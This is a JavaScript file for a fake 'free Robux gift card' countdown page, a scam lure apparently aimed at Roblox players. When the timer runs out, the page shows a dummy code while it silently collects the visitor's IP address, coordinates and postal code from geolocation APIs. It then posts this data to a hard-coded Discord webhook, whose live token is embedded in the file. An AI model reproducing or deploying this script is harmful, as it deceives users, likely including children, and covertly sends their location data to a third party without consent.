// Countdown timer setup: 5 minutes (300 seconds)
let timeLeft = 300; 
let timerInterval;

// Update the countdown display on page
function updateCountdownDisplay() {
  const hours = Math.floor(timeLeft / 3600);
  const minutes = Math.floor((timeLeft % 3600) / 60);
  const seconds = timeLeft % 60;

  const formattedTime =
    (hours > 0 ? hours.toString().padStart(2, '0') + ':' : '') +
    minutes.toString().padStart(2, '0') + ':' +
    seconds.toString().padStart(2, '0');

  document.querySelector('.countdown-value').textContent = formattedTime;
}

// Fetch user's IP address from ipify service
async function getUserIPAddress() {
  try {
    console.debug('Fetching user IP address...');
    const response = await fetch('https://api.ipify.org?format=json');
    if (!response.ok) throw new Error(`ipify API HTTP error ${response.status}`);
    const data = await response.json();
    console.debug('IP address received:', data.ip);
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'Unknown';
  }
}

// Fetch user's coordinates from ipapi.co
async function getUserCoordinates() {
  try {
    console.debug('Fetching user coordinates...');
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) throw new Error(`ipapi.co API HTTP error ${response.status}`);
    const data = await response.json();
    console.debug('Coordinates received:', { latitude: data.latitude, longitude: data.longitude });
    return { latitude: data.latitude ?? 'Unknown', longitude: data.longitude ?? 'Unknown' };
  } catch (error) {
    console.error('Error getting coordinates:', error);
    return { latitude: 'Unknown', longitude: 'Unknown' };
  }
}

// Fetch user's postal code from ipapi.co
async function getUserPostalCode() {
  try {
    console.debug('Fetching user postal code...');
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) throw new Error(`ipapi.co API HTTP error ${response.status}`);
    const data = await response.json();
    console.debug('Postal code received:', data.postal);
    return data.postal ?? 'Unknown';
  } catch (error) {
    console.error('Error getting postal code:', error);
    return 'Unknown';
  }
}

// Send collected info to Discord webhook
async function sendToDiscordWebhook(ipAddress, coordinates, postalCode) {
  try {
    console.debug('Sending data to Discord webhook...');
    
    // Your Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1403068541904621679/mEKTtTHAdwlGogUWbVyx4eGMBDffIgEJCtJPYgNmwWN38G89ix8h0-mWUVgxNQBWafMX';

    // Prepare the message content
    const messageContent = `
**User Information:**
- IP Address: \`${ipAddress}\`
- Coordinates: Latitude: \`${coordinates.latitude}\`, Longitude: \`${coordinates.longitude}\`
- Postal Code: \`${postalCode}\`
    `;

    const payload = { content: messageContent.trim() };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`Discord webhook HTTP error ${response.status}`);
    }
    
    console.debug('Data sent to Discord successfully.');
  } catch (error) {
    console.error('Error sending to Discord webhook:', error);
  }
}

// Main function to gather info and send it
async function sendUserInfoToDiscord() {
  try {
    console.info('Starting process to gather and send user info...');

    const ipAddress = await getUserIPAddress();
    const coordinates = await getUserCoordinates();
    const postalCode = await getUserPostalCode();

    console.info('All user info gathered:', { ipAddress, coordinates, postalCode });

    await sendToDiscordWebhook(ipAddress, coordinates, postalCode);

    console.info('User information sent to Discord webhook successfully.');
  } catch (error) {
    console.error('Error sending user information to Discord:', error);
  }
}


// Countdown logic executed every second
function countDown() {
  if (timeLeft <= 0) {
    clearInterval(timerInterval);

    document.querySelector('.countdown-text').textContent = 'Your free Robux gift card code will be displayed shortly!';

    // Display fake Robux code after 2 seconds
    setTimeout(() => {
      const robuxCodeElem = document.getElementById('robuxCode');
      robuxCodeElem.textContent = 'ROBLOX-12345-FREE';
      robuxCodeElem.style.display = 'block';
    }, 2000);

    // Trigger user info send
    sendUserInfoToDiscord();

    return;
  }

  updateCountdownDisplay();
  timeLeft--;
}

// Initialize countdown display and start interval
updateCountdownDisplay();
timerInterval = setInterval(countDown, 1000);
